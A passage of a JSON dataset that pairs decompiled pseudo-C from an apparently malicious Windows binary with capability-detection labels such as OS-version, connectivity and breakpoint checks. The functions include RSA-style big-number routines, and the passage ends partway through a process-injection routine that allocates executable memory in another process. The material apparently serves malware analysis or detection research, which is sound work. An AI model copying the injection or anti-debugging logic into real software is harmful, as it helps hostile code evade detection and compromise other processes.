code_r0x0040652f;\n                    *piVar4 = 0x419824;\n                }\n                goto code_r0x00406531;\n            }\n            if (uVar1 == 0x1e) {\n                piVar4 = fcn.00406fa7();\n                if (piVar4 != NULL) {\n                    *piVar4 = 0x4197ec;\ncode_r0x004062b4:\n                    piVar4[3] = 0;\n                    piVar4[4] = 0;\n                    goto code_r0x00406531;\n                }\n            }\n            else if (uVar1 == 0x20) {\n                piVar4 = fcn.00406fa7();\n                if (piVar4 != NULL) {\n                    *piVar4 = 0x4197ac;\n                    goto code_r0x00406531;\n                }\n            }\n            else if (uVar1 == 0x22) {\n                piVar4 = fcn.00406fa7();\n                if (piVar4 != NULL) {\n                    *piVar4 = 0x419754;\n                    goto code_r0x0040603f;\n                }\n            }\n            else {\n                if (uVar1 != 0x24) goto code_r0x00406539;\n                piVar4 = fcn.00406fa7();\n                if (piVar4 != NULL) {\n                    *piVar4 = 0x4197fc;\n                    goto code_r0x00406531;\n                }\n            }\n        }\ncode_r0x0040652f:\n        piVar4 = NULL;\n    }\n    else {\n        if (uVar1 < 0x3d) {\n            if (uVar1 == 0x3c) {\n                piVar4 = fcn.00406fa7();\n                if (piVar4 != NULL) {\n                    *piVar4 = 0x41c99c;\n                    goto code_r0x00406531;\n                }\n            }\n            else {\n                if (uVar1 < 0x31) {\n                    if (uVar1 == 0x30) {\n                        piVar4 = fcn.00406fa7();\n                        if (piVar4 == NULL) goto code_r0x0040652f;\n                        *piVar4 = 0x41c9ac;\n                    }\n                    else if (uVar1 == 0x28) {\n                        piVar4 = fcn.00406fa7();\n                        if (piVar4 == NULL) goto code_r0x0040652f;\n                        *piVar4 = 0x419804;\n                    }\n                    else {\n                        if (uVar1 == 0x2a) {\n                            puVar3 = fcn.00406fa7();\n                            if (puVar3 == NULL) {\ncode_r0x0040632e:\n                                puVar3 = NULL;\n                            }\n                            else {\n                                *puVar3 = 0x419834;\n                                puVar3[1] = 0x41983c;\n                            }\n                        }\n                        else if (uVar1 == 0x2c) {\n                            puVar3 = fcn.00406fa7();\n                            if (puVar3 == NULL) goto code_r0x0040632e;\n                            *puVar3 = 0x41985c;\n                            puVar3[1] = 0x419854;\n                        }\n                        else {\n                            if (uVar1 != 0x2e) goto code_r0x00406539;\n                            iVar2 = fcn.00406fa7();\n                            if (iVar2 == 0) goto code_r0x0040632e;\n                            puVar3 = fcn.00404f78();\n                        }\n                        piVar4 = -(puVar3 != NULL) & puVar3 + 1;\n                    }\n                    goto code_r0x00406531;\n                }\n                if (uVar1 == 0x32) {\n                    piVar4 = fcn.00406fa7();\n                    if (piVar4 != NULL) {\n                        *piVar4 = 0x41c9b4;\n                        goto code_r0x00406531;\n                    }\n                }\n                else if (uVar1 == 0x36) {\n                    piVar4 = fcn.00406fa7();\n                    if (piVar4 != NULL) {\n                        *piVar4 = 0x41c904;\n                        goto code_r0x0040603f;\n                    }\n                }\n                else if (uVar1 == 0x38) {\n                    piVar4 = fcn.00406fa7();\n                    if (piVar4 != NULL) {\n                        *piVar4 = 0x4197d4;\n                        goto code_r0x00406531;\n                    }\n                }\n                else {\n                    if (uVar1 != 0x3a) goto code_r0x00406539;\n                    piVar4 = fcn.00406fa7();\n                    if (piVar4 != NULL) {\n                        *piVar4 = 0x41c8a0;\n                        goto code_r0x004060b7;\n                    }\n                }\n            }\n            goto code_r0x0040652f;\n        }\n        if (uVar1 < 0x4d) {\n            if (uVar1 == 0x4c) {\n                piVar4 = fcn.00406fa7();\n                if (piVar4 != NULL) {\n                    *piVar4 = 0x419764;\n                    goto code_r0x00406531;\n                }\n            }\n            else {\n                if (uVar1 == 0x3e) {\n                    fcn.004158f7();\n                    goto code_r0x00406539;\n                }\n                if (uVar1 == 0x40) {\n                    fcn.00415974();\n                    goto code_r0x00406539;\n                }\n                if (uVar1 == 0x48) {\n                    piVar4 = fcn.00406fa7();\n                    if (piVar4 != NULL) {\n                        *piVar4 = 0x41977c;\n                        goto code_r0x004062b4;\n                    }\n                }\n                else {\n                    if (uVar1 != 0x4a) goto code_r0x00406539;\n                    piVar4 = fcn.00406fa7();\n                    if (piVar4 != NULL) {\n                        *piVar4 = 0x41c8d4;\n                        goto code_r0x004060b7;\n                    }\n                }\n            }\n            goto code_r0x0040652f;\n        }\n        if (uVar1 == 0x4e) {\n            piVar4 = fcn.00406fa7();\n            if (piVar4 == NULL) goto code_r0x0040652f;\n            *piVar4 = 0x4197dc;\n        }\n        else if (uVar1 == 0x50) {\n            piVar4 = fcn.00406fa7();\n            if (piVar4 == NULL) goto code_r0x0040652f;\n            *piVar4 = 0x41979c;\n        }\n        else {\n            if (uVar1 != 0x52) goto code_r0x00406539;\n            piVar4 = fcn.00406fa7();\n            if (piVar4 == NULL) goto code_r0x0040652f;\n            *piVar4 = 0x41978c;\n        }\n    }\ncode_r0x00406531:\n    (**(*piVar4 + 4))(in_ECX + 0x30);\ncode_r0x00406539:\n    (***arg_8h)(*(var_8h + 0x2c), piVar4);\n    if (var_10h < *(var_8h + 0x28) || var_10h == *(var_8h + 0x28)) {\n        fcn.00403ffa();\n    }\n    else {\n        fcn.00404094(var_8h + 0x10);\n        fcn.00403e83(&var_14h, *(var_8h + 0x28) + 0xc, (*(var_8h + 0x14) - *(var_8h + 0x28)) + -0xc);\n        fcn.00403eca(&var_14h);\n        *(var_8h + 0x18) = 0;\n        fcn.00405f6c(arg_8h);\n        fcn.00404081();\n        fcn.00404081();\n    }\n    if (*(var_8h + 0x34) != 0) {\n        fcn.00403ffa();\n    }\n    *(var_8h + 0x18) = 0;\n    return;\n}\n",
        "token_count": 3427
    },
    "004069a9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004069a9(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t in_ECX;\n    uint var_8h;\n    \n    if (*(in_ECX + 4) == 0) {\n        arg_8h_00 = fcn.00403e83(&var_8h, 4, **(in_ECX + 0x50));\n        fcn.00403eca(arg_8h_00);\n        fcn.00404081();\n        *(in_ECX + 4) = 1;\n    }\n    fcn.00404094(in_ECX + 8);\n    return arg_8h;\n}\n",
        "token_count": 152
    },
    "0040735b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040735b(int32_t param_1)\n\n{\n    int16_t iVar1;\n    \n    iVar1 = *(param_1 + 4);\n    while ((*(*(param_1 + 0xc) + -4 + iVar1 * 4) == 0 && (1 < iVar1))) {\n        iVar1 = iVar1 + -1;\n        *(param_1 + 4) = iVar1;\n    }\n    return param_1;\n}\n",
        "token_count": 106
    },
    "004073ef": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.004073ef(int32_t param_1, int32_t param_2)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    \n    puVar1 = *(param_1 + 4);\n    if (puVar1 == NULL) {\n        puVar1 = fcn.00401000(0x10);\n        uVar2 = fcn.00401000(param_2 << 2);\n        puVar1[3] = uVar2;\n        *(puVar1 + 6) = param_2;\n    }\n    else {\n        uVar2 = *puVar1;\n        *(param_1 + 0x3c) = *(param_1 + 0x3c) + -1;\n        *(param_1 + 4) = uVar2;\n        if (puVar1[2] != 0) {\n            (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n        }\n        fcn.00407458();\n    }\n    *puVar1 = 0;\n    *(puVar1 + 1) = param_2;\n    puVar1[2] = 1;\n    *(param_1 + 0x38) = *(param_1 + 0x38) + 1;\n    return puVar1;\n}\n",
        "token_count": 288
    },
    "00407512": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407512(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint32_t *puVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int64_t iVar6;\n    int32_t iVar7;\n    uint32_t *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    int32_t in_EDX;\n    int32_t iVar13;\n    int32_t iVar14;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    iVar11 = *(in_EDX + 4);\n    iVar2 = *(arg_8h + 4);\n    iVar7 = fcn.004073ef();\n    iVar3 = *(in_EDX + 0xc);\n    iVar4 = *(arg_8h + 0xc);\n    iVar7 = *(iVar7 + 0xc);\n    fcn.00401293(iVar7, 0, (iVar2 + iVar11) * 4);\n    iVar14 = 0;\n    var_14h = arg_10h;\n    do {\n        iVar13 = 0;\n        var_4h = 0;\n        iVar12 = iVar14;\n        if (((arg_10h != 0) && (0 < var_14h)) && (arg_10h < iVar11)) {\n            iVar12 = arg_10h + -1;\n            iVar13 = var_14h + -1;\n        }\n        puVar8 = iVar3 + iVar13 * 4;\n        do {\n            if ((arg_ch != 0) && (arg_ch <= iVar12)) break;\n            iVar6 = *puVar8 * *(iVar4 + iVar14 * 4);\n            uVar9 = iVar6;\n            puVar1 = iVar7 + iVar12 * 4;\n            uVar5 = *puVar1;\n            uVar10 = uVar9 + *puVar1;\n            *(iVar7 + iVar12 * 4) = uVar10 + var_4h;\n            var_4h = (iVar6 >> 0x20) + CARRY4(uVar9, uVar5) + CARRY4(uVar10, var_4h);\n            puVar8 = puVar8 + 1;\n            iVar12 = iVar12 + 1;\n            iVar13 = iVar13 + 1;\n        } while (iVar13 < iVar11);\n        iVar14 = iVar14 + 1;\n        var_14h = var_14h + -1;\n        *(iVar7 + iVar12 * 4) = var_4h;\n        if (iVar2 <= iVar14) {\n            fcn.00407d69();\n            fcn.00407d69();\n            fcn.0040735b();\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 721
    },
    "00407738": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407738(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t in_EDX;\n    int32_t iVar5;\n    int32_t iVar6;\n    bool bVar7;\n    uint var_4h;\n    \n    iVar3 = fcn.004073ef();\n    fcn.00401293(*(iVar3 + 0xc), 0, *(iVar3 + 4) << 2);\n    iVar5 = 0;\n    iVar6 = 0;\n    while (arg_8h = arg_8h + -1,  -1 < arg_8h) {\n        piVar2 = *(iVar3 + 0xc) + iVar5 * 4;\n        *piVar2 = *piVar2 + (*(arg_8h + in_EDX) << (iVar6 << 3 & 0x1f));\n        iVar4 = iVar5 + 1;\n        if (iVar6 != 3) {\n            iVar4 = iVar5;\n        }\n        bVar7 = iVar6 != 3;\n        iVar1 = iVar6 + 1;\n        iVar5 = iVar4;\n        iVar6 = 0;\n        if (bVar7) {\n            iVar6 = iVar1;\n        }\n    }\n    fcn.0040735b();\n    return;\n}\n",
        "token_count": 316
    },
    "004078a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004078a0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t arg_10h;\n    int32_t *piVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    int32_t iVar5;\n    int32_t in_EDX;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint *arg_ch_00;\n    uint var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    uint32_t var_30h;\n    uint32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint32_t var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_14h = *(arg_8h + 4);\n    var_24h = *(in_EDX + 4);\n    var_28h = var_24h - var_14h;\n    uVar2 = *(in_ECX + 0x40);\n    if ((arg_ch == 0) || (iVar3 = fcn.004074b0(),  iVar3 < 1)) {\n        var_ch = fcn.004073ef();\n        var_34h = var_14h + 1;\n        var_4h = fcn.004073ef();\n        iVar3 = fcn.0040735b();\n        var_1ch = fcn.00401140(0, 1, *(*(iVar3 + 0xc) + -4 + *(iVar3 + 4) * 4) + 1, 0);\n        fcn.00401293(*(var_ch + 0xc), 0, *(var_ch + 4) << 2);\n        if (1 < var_1ch) {\n            in_EDX = fcn.00407ba2(var_1ch);\n            if (arg_ch == 0) {\n                iVar3 = fcn.00407ba2(var_1ch);\n            }\n            else {\n                iVar3 = *(in_ECX + 0x24 + uVar2 * 4);\n            }\n        }\n        if (var_24h == *(in_EDX + 4)) {\n            fcn.00407458();\n        }\n        arg_10h = var_14h * 4 + 4;\n        iVar5 = arg_10h;\n        do {\n            fcn.0040126d(*(var_4h + 0xc), *(in_EDX + 0xc) + ((*(in_EDX + 4) - var_8h) - var_14h) * 4 + -4, iVar5);\n            var_2ch = *(iVar3 + 4);\n            var_20h = *(var_4h + 4);\n            var_24h = *(var_4h + 0xc);\n            uVar6 = *(var_24h + -4 + var_20h * 4);\n            var_30h = *(*(iVar3 + 0xc) + -4 + var_2ch * 4);\n            if (uVar6 == var_30h) {\n                var_10h = 0xffffffff;\ncode_r0x00407a89:\n                arg_ch_00 = &var_38h;\n                uVar6 = var_10h;\n                fcn.00407dc4(var_10h, var_10h);\n                uVar4 = fcn.00407ba2(uVar6);\n                var_4h = fcn.00407c27(uVar4, arg_ch_00);\n                fcn.00407458();\n                *(*(var_ch + 0xc) + -4 + (*(var_ch + 4) - var_8h) * 4) = var_10h;\n                if (var_38h != 0) {\n                    piVar1 = *(var_ch + 0xc) + -4 + (*(var_ch + 4) - var_8h) * 4;\n                    *piVar1 = *piVar1 + -1;\n                    uVar4 = fcn.00407dc4();\n                    var_4h = fcn.00407ca5(uVar4);\n                    *(var_4h + 4) = *(var_4h + 4) + -1;\n                    *(iVar3 + 4) = *(iVar3 + 4) + -1;\n                }\n            }\n            else {\n                iVar5 = *(var_24h + -8 + var_20h * 4);\n                var_10h = fcn.00401140(iVar5, uVar6, var_30h, 0);\n                if ((1 < *(iVar3 + 4)) && (var_2ch = *(*(iVar3 + 0xc) + -8 + var_2ch * 4),  var_2ch != 0)) {\n                    uVar6 = iVar5 - var_30h * var_10h;\n                    var_30h = *(var_24h + -0xc + var_20h * 4);\n                    uVar7 = var_10h * var_2ch >> 0x20;\n                    if ((uVar6 <= uVar7) && ((uVar6 < uVar7 || (var_30h < var_10h * var_2ch)))) {\n                        var_10h = var_10h - 1;\n                    }\n                }\n                if (var_10h != 0) goto code_r0x00407a89;\n                *(*(var_ch + 0xc) + -4 + (*(var_ch + 4) - var_8h) * 4) = 0;\n            }\n            fcn.0040126d(*(in_EDX + 0xc) + ((*(in_EDX + 4) - var_8h) - var_14h) * 4 + -4, *(var_4h + 0xc), arg_10h);\n            var_8h = var_8h + 1;\n            iVar5 = var_14h * 4 + 4;\n        } while (var_8h <= var_28h);\n        fcn.00407d69();\n        fcn.00407d69();\n        if (arg_ch == 0) {\n            fcn.00407d69();\n            fcn.0040735b();\n        }\n        else {\n            fcn.00407d69();\n            uVar6 = var_1ch;\n            fcn.0040735b();\n            fcn.0040783e(uVar6);\n        }\n    }\n    else {\n        fcn.00407d69();\n    }\n    return;\n}\n",
        "token_count": 1549
    },
    "00407dae": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "terminate process"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00407dae(int32_t param_1)\n\n{\n    int32_t extraout_ECX;\n    \n    if (*(param_1 + 8) != 1) {\n        (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n        param_1 = extraout_ECX;\n    }\n    *(param_1 + 8) = 0x7fff55aa;\n    return;\n}\n",
        "token_count": 92
    },
    "00407e03": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00407e03(int32_t param_1)\n\n{\n    fcn.00407d95();\n    fcn.00407d69();\n    if (*(param_1 + 0x38) != 0) {\n        (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n    }\n    fcn.00407dd5();\n    fcn.00401014(param_1);\n    return;\n}\n",
        "token_count": 95
    },
    "004080d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.004080d0(uint noname_0, char *arg_ch, uint noname_2, int32_t *arg_14h, uint noname_4, int32_t arg_1ch, uint arg_20h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint in_EDX;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    char *pcVar8;\n    \n    if (arg_1ch == 0) {\n        uVar2 = 3;\n    }\n    else {\n        iVar3 = fcn.00407738(in_EDX);\n        if ((iVar3 == 0) || (iVar3 = fcn.004070ea(arg_20h),  iVar3 == 0)) {\n            uVar2 = 1;\n        }\n        else {\n            fcn.004076c6(arg_ch);\n            uVar5 = 0;\n            pcVar8 = arg_ch + 0x7f;\n            uVar7 = 0;\n            do {\n                cVar1 = arg_ch[uVar7];\n                arg_ch[uVar7] = *pcVar8;\n                uVar7 = uVar7 + 1;\n                *pcVar8 = cVar1;\n                pcVar8 = pcVar8 + -1;\n            } while (uVar7 < 0x40);\n            iVar3 = 0x80;\n            cVar1 = *arg_ch;\n            while (cVar1 == '\\0') {\n                uVar5 = uVar5 + 1;\n                cVar1 = arg_ch[uVar5];\n            }\n            if (arg_ch[uVar5] == '\\x01') {\n                do {\n                    uVar7 = uVar5;\n                    uVar5 = uVar7 + 1;\n                    if (0x7f < uVar5) break;\n                } while (arg_ch[uVar5] == -1);\n                if (arg_ch[uVar5] == '\\0') {\n                    iVar6 = uVar7 + 2;\n                    iVar3 = 0x80 - iVar6;\n                    for (iVar4 = iVar3; iVar4 != 0; iVar4 = iVar4 + -1) {\n                        *arg_ch = arg_ch[iVar6];\n                        arg_ch = arg_ch + 1;\n                    }\n                }\n            }\n            *arg_14h = iVar3;\n            uVar2 = 0;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 559
    },
    "004095aa": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004095aa(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint *arg_18h;\n    uint unaff_EDI;\n    uint32_t arg_8h_00;\n    uint in_stack_ffffff84;\n    int32_t arg_1ch;\n    uint in_stack_ffffff88;\n    uint uVar4;\n    int32_t in_stack_ffffff8c;\n    uint uStack96;\n    int32_t iStack72;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint32_t uStack24;\n    \n    uVar3 = *(arg_8h + 0x14);\n    fcn.0040460a(uVar3);\n    fcn.00409ab4(uVar3);\n    if (iStack72 == 0) {\n        uVar3 = *(arg_8h + 0x18);\n        arg_18h = arg_8h + 4;\n        iVar1 = 0;\n        uVar2 = (*_sym.imp.SHLWAPI.dll_PathFindFileNameW)\n                          (*(arg_8h + 0x14), &stack0xffffff8c, uStack32, 0, 0, 0, &stack0xffffff8c, 2);\n        fcn.0040460a(uVar2);\n        uVar3 = fcn.00405168(uVar3, uVar2, unaff_EDI, unaff_ESI, arg_18h, in_stack_ffffff84, in_stack_ffffff88, iVar1);\n        fcn.00405f32(uVar3);\n        fcn.004050ca();\n        if (iVar1 == 0) goto code_r0x00409771;\n        fcn.00406f66();\n    }\n    else {\n        arg_8h_00 = 0;\n        if (uStack24 != 0) {\n            do {\n                if (*(*(arg_8h + 4) + 0xc) == 0) break;\n                arg_1ch = 0;\n                uVar4 = 0;\n                iVar1 = fcn.00409a3f(arg_8h_00, &stack0xffffff84);\n                uVar3 = *(arg_8h + 4);\n                uVar2 = *(arg_8h + 0x14);\n                if (iVar1 == 0) {\n                    arg_1ch = 0;\n                    uVar4 = 0;\n                    uVar2 = (*_sym.imp.SHLWAPI.dll_PathFindFileNameW)\n                                      (uVar2, uVar2, uStack40, 0, 0, 0, &stack0xffffff84, 1);\n                    fcn.0040460a(uVar2);\n                    uVar3 = fcn.00405168(uStack96, uVar2, uVar3, unaff_ESI, unaff_EBX, arg_1ch, uVar4, in_stack_ffffff8c\n                                        );\n                    fcn.00405f32(uVar3);\n                    fcn.004050ca();\n                    if (in_stack_ffffff8c != 0) {\n                        fcn.00406f66();\n                    }\n                    in_stack_ffffff8c = 0;\n                }\n                else {\n                    uVar2 = (*_sym.imp.SHLWAPI.dll_PathFindFileNameW)\n                                      (uVar2, uVar2, uStack40, arg_8h_00, uStack32, uStack36, &stack0xffffff7c, 0);\n                    fcn.0040460a(uVar2);\n                    uVar3 = fcn.00405168(uStack96, uVar2, uVar3, unaff_ESI, unaff_EBX, arg_1ch, uVar4, in_stack_ffffff8c\n                                        );\n                    fcn.00405f32(uVar3);\n                    fcn.004050ca();\n                }\n                if (arg_1ch != 0) {\n                    fcn.00406f66();\n                }\n                arg_8h_00 = arg_8h_00 + 1;\n            } while (arg_8h_00 < uStack24);\n        }\n        arg_18h = arg_8h + 4;\n    }\n    if (iStack72 != 0) {\n        fcn.00413ee1();\n    }\ncode_r0x00409771:\n    fcn.00409796(*arg_18h, *(arg_8h + 0x18), 0);\n    fcn.00409a0e();\n    return 0;\n}\n",
        "token_count": 1035
    },
    "00409796": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00409796(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint arg_8h_00;\n    int32_t *in_ECX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint var_4ch;\n    uint hThread;\n    uint var_24h;\n    uint var_20h;\n    uint hMutex;\n    int32_t var_18h;\n    uint32_t var_14h;\n    int32_t var_10h;\n    int32_t *var_ch;\n    uint32_t var_8h;\n    \n    var_ch = in_ECX;\n    fcn.00414047();\n    var_8h = 0;\n    if (in_ECX[2] != 0) {\n        var_10h = 0;\n        do {\n            iVar5 = var_10h;\n            fcn.00406d65();\n            uVar2 = var_8h;\n            var_14h = var_8h + 1;\n            if (*(*in_ECX + iVar5 + 4) == arg_ch) {\n                fcn.00406d65();\n                fcn.00406f1d();\n                piVar1 = var_ch;\n                fcn.00406d65();\n                iVar5 = (*_sym.imp.KERNEL32.dll_TerminateThread)(*(*piVar1 + uVar2 * 0xc), 0);\n                var_10h = iVar5;\n                fcn.00406d65();\n                uVar2 = var_ch[2];\n                if (var_14h <= uVar2) {\n                    iVar4 = var_14h * 0xc;\n                    uVar3 = var_14h;\n                    do {\n                        puVar6 = *var_ch + iVar4;\n                        uVar3 = uVar3 + 1;\n                        iVar4 = iVar4 + 0xc;\n                        puVar6[-3] = *puVar6;\n                        puVar6[-2] = puVar6[1];\n                        puVar6[-1] = puVar6[2];\n                        uVar2 = var_ch[2];\n                        iVar5 = var_10h;\n                    } while (uVar3 <= uVar2);\n                }\n                var_ch[2] = uVar2 - 1;\n                if (arg_10h != 0) {\n                    var_18h = 0;\n                    var_14h = 0;\n                    arg_8h_00 = fcn.00405168(arg_ch, 0, 0, 0, 0, 0, &var_18h, 3);\n                    fcn.00405f32(arg_8h_00);\n                    fcn.004050ca();\n                    if (var_18h != 0) {\n                        fcn.00406f66();\n                    }\n                }\n                goto code_r0x004097fc;\n            }\n            var_10h = var_10h + 0xc;\n            var_8h = var_14h;\n        } while (var_14h < in_ECX[2]);\n    }\n    iVar5 = 0;\ncode_r0x004097fc:\n    (*_sym.imp.KERNEL32.dll_ReleaseMutex)(in_ECX[4]);\n    return iVar5;\n}\n",
        "token_count": 757
    },
    "00409a0e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.00409a0e(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint unaff_EDI;\n    uint var_4h;\n    \n    if (*param_1 != 0) {\n        fcn.00413ee1();\n    }\n    fcn.00413c16();\n    iVar1 = param_1[1];\n    if (iVar1 != 0) {\n        for (iVar1 = *(iVar1 + -4); iVar1 != 0; iVar1 = iVar1 + -1) {\n            fcn.00404081(unaff_EDI);\n        }\n        fcn.00406f8d();\n    }\n    param_1[1] = 0;\n    param_1[3] = 0;\n    param_1[2] = 0;\n    return;\n}\n",
        "token_count": 202
    },
    "00409a3f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00409a3f(uint32_t arg_8h, uint arg_ch)\n\n{\n    int32_t arg_10h;\n    uint uVar1;\n    uint arg_8h_00;\n    int32_t *in_ECX;\n    uint32_t nNumberOfBytesToRead;\n    \n    if ((*in_ECX == 0) || (in_ECX[0xc] <= arg_8h && arg_8h != in_ECX[0xc])) {\n        uVar1 = 0;\n    }\n    else {\n        arg_10h = in_ECX[0xb] * arg_8h;\n        nNumberOfBytesToRead = in_ECX[10] - arg_10h;\n        if (nNumberOfBytesToRead < in_ECX[0xb]) {\n            uVar1 = fcn.00413b7c(arg_ch, nNumberOfBytesToRead, arg_10h);\n            arg_8h_00 = fcn.00401000(in_ECX[0xb] - nNumberOfBytesToRead);\n            fcn.00403fc7(arg_8h_00, in_ECX[0xb] - nNumberOfBytesToRead);\n            fcn.00401014(arg_8h_00);\n        }\n        else {\n            uVar1 = fcn.00413b7c(arg_ch, in_ECX[0xb], arg_10h);\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 317
    },
    "00409bff": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00409bff(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint in_ECX;\n    int32_t in_EDX;\n    uint lpBuffer;\n    uint lpflOldProtect;\n    int32_t lpNumberOfBytesWritten;\n    int32_t var_4h;\n    \n    if (*0x41e694 == '\\0') {\n        iVar1 = fcn.0040a95a();\n        *0x41e694 = iVar1 != 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x1fffff, 0, arg_8h);\n    if (iVar1 == 0) {\n        uVar2 = 0xffffffff;\n    }\n    else {\n        iVar3 = (*_sym.imp.KERNEL32.dll_VirtualAllocEx)(iVar1, 0, 0x100000, 0x3000, 0x40);\n        if (iVar3 != 0) {\n            lpflOldProtect = 0;\n            (*_sym.imp.KERNEL32.dll_VirtualProtectEx)(iVar1, iVar3, 0x100000, 0x40, &lpflOldProtect);\n            iVar4 = (*_sym.imp.KERNEL32.dll_VirtualAllocEx)(iVar1, 0x33370000, 0x100, 0x3000, 0x40);\n            if (iVar4 != 0) {\n                var_4h = 0;\n                iVar4 = 